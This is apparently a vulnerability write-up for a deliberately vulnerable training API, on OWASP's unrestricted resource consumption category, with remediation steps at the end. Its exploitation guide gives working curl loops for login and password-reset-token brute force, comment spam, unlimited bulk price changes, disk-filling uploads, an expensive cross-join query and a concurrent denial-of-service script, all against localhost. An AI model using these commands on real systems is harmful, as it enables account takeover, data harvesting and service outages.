API4:2023 Unrestricted Resource Consumption

MEDIUM SEVERITY

Description

APIs that don't properly limit resource consumption are vulnerable to denial of service attacks, resource exhaustion, and cost explosion. This includes lack of rate limiting, no pagination, unrestricted query complexity, and no limits on file uploads or data processing.

Affected Files

  • app/routes/users.py - No pagination, no rate limiting
  • app/routes/products.py - No pagination on lists and exports
  • app/routes/orders.py - No pagination, unlimited bulk operations
  • app/routes/auth.py - No login rate limiting
  • app/routes/files.py - Large file uploads allowed
  • app/config.py - Rate limiting disabled

Exploitation Guide

1. No Pagination - Data Dumping

List endpoints return all records without pagination:

# Get ALL users at once (could be millions in production)
curl http://localhost:5000/api/users

# Get ALL orders
curl http://localhost:5000/api/orders

# Get ALL products
curl http://localhost:5000/api/products

# Get ALL audit logs
curl http://localhost:5000/api/admin/logs \
  -H "Authorization: Bearer $TOKEN"

# Export ALL data at once
curl http://localhost:5000/api/products/export
curl http://localhost:5000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN"

2. No Rate Limiting - Brute Force

Endpoints have no rate limiting, allowing rapid requests:

# Brute force login - no blocking after failed attempts
for i in {1..1000}; do
  curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "attempt'$i'"}' &
done

# Brute force password reset tokens
for token in {100000..999999}; do
  curl -s -X POST http://localhost:5000/api/auth/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@vulnapi.local", "reset_token": "'$token'", "new_password": "hacked"}'
done

# Spam comments
for i in {1..1000}; do
  curl -X POST http://localhost:5000/api/products/1/comments \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"content": "Spam comment '$i'", "rating": 1}'
done

3. Unlimited Bulk Operations

Bulk endpoints have no limits on operation count:

# Bulk update unlimited products
curl -X POST http://localhost:5000/api/products/bulk-price-update \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "updates": [
      {"product_id": 1, "price": 0.01},
      {"product_id": 2, "price": 0.01},
      {"product_id": 3, "price": 0.01}
      // ... could include thousands
    ]
  }'

# Bulk update unlimited orders
curl -X POST http://localhost:5000/api/orders/bulk-status \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "order_ids": [1, 2, 3, 4, 5],
    "status": "cancelled"
  }'

4. Large File Uploads

File upload allows very large files (100MB):

# Create large file (100MB)
dd if=/dev/zero of=largefile.bin bs=1M count=100

# Upload large file
curl -X POST http://localhost:5000/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@largefile.bin"

# Multiple large uploads can exhaust disk space
for i in {1..10}; do
  curl -X POST http://localhost:5000/api/files/upload \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@largefile.bin"
done

5. Expensive Operations Without Limits

# Complex search with no limits
curl "http://localhost:5000/api/users/search?q=a&field=username"

# Database queries without limits
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM users CROSS JOIN products CROSS JOIN orders"}'

6. API Abuse Script

Demonstration script for DoS testing:

#!/bin/bash
# WARNING: Only run against your own test environment!

TARGET="http://localhost:5000"
CONCURRENT=50

# Function to make requests
make_request() {
  while true; do
    curl -s "$TARGET/api/users" > /dev/null &
    curl -s "$TARGET/api/orders" > /dev/null &
    curl -s "$TARGET/api/products" > /dev/null &
  done
}

# Launch concurrent attackers
for i in $(seq 1 $CONCURRENT); do
  make_request &
done

echo "Attack running... Press Ctrl+C to stop"
wait

Impact

  • Denial of Service: Server resources exhausted by many requests
  • Cost Explosion: In cloud environments, excessive resource use = high bills
  • Data Harvesting: Easy to dump entire database via unpaginated endpoints
  • Disk Exhaustion: Large file uploads can fill storage
  • Account Lockout Attacks: Brute force can lock legitimate users

Remediation

  1. Implement rate limiting (e.g., 100 requests/minute per IP)
  2. Add pagination to all list endpoints (max 100 items per page)
  3. Limit file upload sizes (e.g., 5MB max)
  4. Set timeouts for long-running operations
  5. Limit bulk operation batch sizes
  6. Implement request size limits
